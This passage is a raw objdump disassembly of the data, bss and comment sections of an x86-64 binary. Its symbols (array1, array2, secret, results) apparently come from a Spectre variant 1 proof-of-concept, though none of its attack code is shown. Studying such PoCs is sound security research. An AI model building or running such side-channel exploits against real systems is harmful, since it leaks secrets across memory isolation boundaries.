	...
  601017:	00 96 04 40 00 00    	add    %dl,0x4004(%rsi)
  60101d:	00 00                	add    %al,(%rax)
  60101f:	00 a6 04 40 00 00    	add    %ah,0x4004(%rsi)
  601025:	00 00                	add    %al,(%rax)
  601027:	00 b6 04 40 00 00    	add    %dh,0x4004(%rsi)
  60102d:	00 00                	add    %al,(%rax)
  60102f:	00 c6                	add    %al,%dh
  601031:	04 40                	add    $0x40,%al
  601033:	00 00                	add    %al,(%rax)
  601035:	00 00                	add    %al,(%rax)
	...

Disassembly of section .data:

0000000000601040 <__data_start>:
	...

0000000000601060 <array1_size>:
  601060:	10 00                	adc    %al,(%rax)
	...

0000000000601080 <array1>:
  601080:	01 02                	add    %eax,(%rdx)
  601082:	03 04 05 06 07 08 09 	add    0x9080706(,%rax,1),%eax
  601089:	0a 0b                	or     (%rbx),%cl
  60108b:	0c 0d                	or     $0xd,%al
  60108d:	0e                   	(bad)  
  60108e:	0f 10 00             	movups (%rax),%xmm0
	...

0000000000601120 <secret_address>:
  601120:	28 11                	sub    %dl,(%rcx)
  601122:	60                   	(bad)  
  601123:	00 00                	add    %al,(%rax)
  601125:	00 00                	add    %al,(%rax)
	...

0000000000601128 <secret>:
  601128:	e0 0b                	loopne 601135 <__TMC_END__+0x5>
  60112a:	40 00 00             	add    %al,(%rax)
  60112d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .bss:

0000000000601140 <completed.6355>:
	...

0000000000601160 <results.6548>:
	...

0000000000601560 <temp>:
	...

0000000000601580 <unused1>:
	...

00000000006015c0 <array2>:
	...

00000000006215c0 <unused2>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp (%r8),%spl
   5:	28 47 4e             	sub    %al,0x4e(%rdi)
   8:	55                   	push   %rbp
   9:	29 20                	sub    %esp,(%rax)
   b:	34 2e                	xor    $0x2e,%al
   d:	38 2e                	cmp    %ch,(%rsi)
   f:	35 20 32 30 31       	xor    $0x31303220,%eax
  14:	35 30 36 32 33       	xor    $0x33323630,%eax
  19:	20 28                	and    %ch,(%rax)
  1b:	52                   	push   %rdx
  1c:	65 64 20 48 61       	gs and %cl,%fs:0x61(%rax)
  21:	74 20                	je     43 <_init-0x40041d>
  23:	34 2e                	xor    $0x2e,%al
  25:	38 2e                	cmp    %ch,(%rsi)
  27:	35 2d 33 36 29       	xor    $0x2936332d,%eax
	...
